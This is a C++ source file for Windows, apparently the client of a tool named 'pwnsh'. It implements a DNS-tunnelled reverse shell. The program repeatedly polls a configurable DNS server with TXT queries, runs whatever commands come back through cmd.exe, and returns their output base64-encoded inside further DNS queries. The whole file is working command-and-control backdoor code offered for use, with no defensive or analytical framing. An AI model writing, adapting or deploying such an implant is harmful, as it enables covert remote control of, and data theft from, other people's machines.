/*
 * Автор: Андрій Дунай
 * Цей файл є частиною проєкту "pwnsh"
 * 6 червня 2024
 * Ліцензія: WTFPL
 *
 *           DO WHAT THE FUCK YOU WANT TO PUBLIC LICENSE
 *                   Version 2, December 2004
 *
 *  Copyright (C) 2004 Sam Hocevar <sam@hocevar.net>
 *
 *  Everyone is permitted to copy and distribute verbatim or modified
 *  copies of this license document, and changing it is allowed as long
 *  as the name is changed.
 *
 *           DO WHAT THE FUCK YOU WANT TO PUBLIC LICENSE
 *  TERMS AND CONDITIONS FOR COPYING, DISTRIBUTION AND MODIFICATION
 *
 *  0. You just DO WHAT THE FUCK YOU WANT TO.
 */

#include <cstdio>
#include <synchapi.h>
#include <windows.h>
#include <windns.h>

#include "base64m.h"

#ifndef DNS_SERVER
#    define DNS_SERVER "127.0.0.1"
#endif

#ifndef DNS_POLL_INTERVAL
#    define DNS_POLL_INTERVAL 1000
#endif

#define QUEUE_SIZE 256

/// Perform DNS TXT query, return 0 on success
int query(const char* server, const char* hostname, char* response) {
    PDNS_RECORD pDnsRecord;
    DNS_STATUS status;
    IP4_ARRAY dnsServers;
    dnsServers.AddrCount = 1;
    dnsServers.AddrArray[0] = inet_addr(server);

    status = DnsQuery_A(hostname, DNS_TYPE_TEXT, DNS_QUERY_STANDARD, &dnsServers, &pDnsRecord, NULL);

    if (status) {
        return 1;
    }

    strcpy(response, pDnsRecord->Data.TXT.pStringArray[0]);

    return 0;
}

/// Sync data with server.
/// toSend will be sent as DNS TXT query, and the response will be stored in toReceive.
/// Base64 encoding is used to encode and decode the data.
/// toReceive should be freed after use.
void transaction(const char* toSend, char** toReceive) {
    char response[512];
    char* encoded = base64m_encode(toSend);
    query(DNS_SERVER, encoded, response);
    free(encoded);
    char* decoded = base64m_decode(response);
    *toReceive = decoded;
}

/// Main function
int main() {
    char* queue[QUEUE_SIZE];
    unsigned char queue_start = 0;
    unsigned char queue_end = 0;

    while (1) {
        while (queue_start != queue_end) {
            char* command = queue[queue_start];

            if (strlen(command) > 0) {
                printf("Executing command %s\n", command);
                // Launch shell command using cmd.exe and stdout and stderr
                char cmd[512];
                sprintf(cmd, "cmd.exe /c %s", command);
                FILE* pipe = _popen(cmd, "r");
                if (!pipe) {
                    printf("Failed to execute command\n");
                } else {
                    char buffer[128];
                    while (!feof(pipe)) {
                        if (fgets(buffer, 128, pipe) != NULL) {
                            printf("%s", buffer);
                            transaction(buffer, &queue[queue_end]);
                            queue_end = (queue_end + 1) % QUEUE_SIZE;
                        }
                    }
                    // Get the exit code of the process
                    int exit_code = _pclose(pipe);
                    printf("Process exited with code %d\n", exit_code);
                    char result[128];
                    sprintf(result, "Exit code: %d\n", exit_code);
                    transaction(result, &queue[queue_end]);
                    queue_end = (queue_end + 1) % QUEUE_SIZE;
                }
            }

            free(command);
            queue_start = (queue_start + 1) % QUEUE_SIZE;
        }

        // Poll for new commands
        char* command;
        transaction("", &command);
        if (strlen(command) > 0) {
            queue[queue_end] = command;
            queue_end = (queue_end + 1) % QUEUE_SIZE;
        } else {
            Sleep(DNS_POLL_INTERVAL);
        }
    }
    return 0;
}
